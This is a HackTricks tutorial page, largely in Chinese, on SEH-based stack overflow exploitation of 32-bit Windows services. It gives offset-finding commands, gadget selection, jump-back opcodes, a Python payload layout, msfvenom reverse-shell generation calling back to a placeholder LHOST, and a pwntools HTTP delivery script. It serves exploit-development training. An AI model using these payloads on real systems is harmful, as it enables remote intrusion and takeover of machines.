# Windows SEH-based Stack Overflow Exploitation (nSEH/SEH)

{{#include ../../banners/hacktricks-training.md}}

SEH-based exploitation 是一种经典的 x86 Windows 技术，利用存储在栈上的 Structured Exception Handler 链。当一个 stack buffer overflow 覆盖了两个 4 字节字段时：

- nSEH: pointer to the next SEH record, and
- SEH: pointer to the exception handler function

攻击者可以通过以下方式取得执行控制：

1) 将 SEH 设置为非受保护模块中一个 POP POP RET gadget 的地址，这样当异常被分派时，gadget 会返回到攻击者可控的字节处；以及  
2) 使用 nSEH 重定向执行（通常是一个 short jump）回到包含 shellcode 的大溢出缓冲区中。

该技术仅适用于 32-bit processes (x86)。在现代系统上，优先选择没有 SafeSEH 和 ASLR 的模块作为 gadget 所在模块。常见的坏字符通常包括 0x00、0x0a、0x0d (NUL/CR/LF)，这是由于 C-strings 和 HTTP 解析造成的。

---

## Finding exact offsets (nSEH / SEH)

- 使进程崩溃并确认 SEH 链已被覆盖（例如，在 x32dbg/x64dbg 中检查 SEH 视图）。
- 发送一个 cyclic pattern 作为溢出数据，并计算落在 nSEH 和 SEH 的两个 dwords 的偏移量。

Example with peda/GEF/pwntools on a 1000-byte POST body:
```bash
# generate pattern (any tool is fine)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# or
python3 -c "from pwn import *; print(cyclic(1000).decode())"

# after crash, note the two 32-bit values from SEH view and compute offsets
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163   # nSEH
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241   # SEH
# ➜ offsets example: nSEH=660, SEH=664
```
通过在这些位置放置标记来验证（例如，nSEH=b"BB", SEH=b"CC"）。保持总长度不变以使崩溃可复现。

---

## 选择 POP POP RET (SEH gadget)

你需要一个 POP POP RET 序列来解开 SEH 帧并返回到你的 nSEH 字节。 在没有 SafeSEH 的模块中查找，最好也没有 ASLR：

- Mona (Immunity/WinDbg): `!mona modules` 然后 `!mona seh -m modulename`.
- x64dbg plugin ERC.Xdbg: `ERC --SEH` 用于列出 POP POP RET gadgets 和 SafeSEH 状态。

选择一个在以 little-endian 写入时不包含 badchars 的地址（例如，`p32(0x004094D8)`）。如果防护允许，优先选择位于易受攻击二进制文件内的 gadget。

---

## Jump-back technique (short + near jmp)

nSEH 只有 4 字节，最多能放一个 2 字节的 short jump（`EB xx`）加上填充。如果你必须向后跳几百字节以到达缓冲区起始位置，可以在 nSEH 之前放置一个 5 字节的 near jump，然后从 nSEH 用 short jump 链接到它。

使用 nasmshell:
```text
nasm> jmp -660           ; too far for short; near jmp is 5 bytes
E967FDFFFF
nasm> jmp short -8       ; 2-byte short jmp fits in nSEH (with 2 bytes padding)
EBF6
nasm> jmp -652           ; 8 bytes closer (to account for short-jmp hop)
E96FFDFFFF
```
1000-byte payload 且 nSEH 在 offset 660 的布局思路：
```python
buffer_length = 1000
payload  = b"\x90"*50 + shellcode                    # NOP sled + shellcode at buffer start
payload += b"A" * (660 - 8 - len(payload))           # pad so we are 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"     # near jmp -652 (5B) + 3B padding
payload += b"\xEB\xF6" + b"BB"                      # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                           # SEH: POP POP RET (no badchars)
payload += b"D" * (buffer_length - len(payload))
```
执行流程：
- 异常发生，调度器使用被覆盖的 SEH。
- POP POP RET 将堆栈展开到我们的 nSEH。
- nSEH 执行 `jmp short -8`，进入那个 5 字节的 near jump。
- Near jump 落在缓冲区开头，那里有 NOP sled + shellcode。

---

## Bad characters

构建完整的 badchar 字符串，并在崩溃后比较堆栈内存，移除被目标解析器破坏的字节。对于基于 HTTP 的溢出，`\x00\x0a\x0d` 几乎总是被排除。
```python
badchars = bytes([x for x in range(1,256)])
payload  = b"A"*660 + b"BBBB" + b"CCCC" + badchars  # position appropriately for your case
```
---

## Shellcode 生成 (x86)

使用 msfvenom 并指定你的 badchars。一个小的 NOP sled 可帮助容忍落点偏差。
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f python -v sc
```
如果在运行时生成，hex 格式便于在 Python 中嵌入并进行 unhex：
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f hex
```
---

## Delivering over HTTP (precise CRLF + Content-Length)

当攻击向量是 HTTP 请求体时，构造一个带有精确 CRLFs 和 Content-Length 的原始请求，以便服务器读取整个溢出的请求体。
```python
# pip install pwntools
from pwn import remote
host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # replace with the SEH-aware buffer above
req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close

""".replace('\n','\r\n').encode() + body
p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```
---

## 工具

- x32dbg/x64dbg 用于观察 SEH 链并对崩溃进行初步分析。
- ERC.Xdbg (x64dbg plugin) 用于枚举 SEH gadgets: `ERC --SEH`.
- Mona 作为替代工具: `!mona modules`, `!mona seh`.
- nasmshell 用于汇编短/近跳转并拷贝原始操作码。
- pwntools 用于构造精确的网络 payloads。

---

## 注意事项与警告

- 仅适用于 x86 进程。x64 使用不同的 SEH 机制，基于 SEH 的利用通常不可行。
- 优先选择位于没有 SafeSEH 和 ASLR 保护的模块中的 gadgets；否则，找到加载到进程中的未受保护模块。
- 在崩溃后会自动重启的服务监护程序（service watchdogs）可以使迭代式 exploit 开发更便捷。

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [ERC.Xdbg – Exploit Research Plugin for x64dbg (SEH search)](https://github.com/Andy53/ERC.Xdbg)
- [Corelan – Exploit writing tutorial part 7 (SEH)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-7-unicode-0day-buffer-overflow-seh-and-venetian-shellcode/)
- [Mona.py – WinDbg/Immunity helper](https://github.com/corelan/mona)

{{#include ../../banners/hacktricks-training.md}}
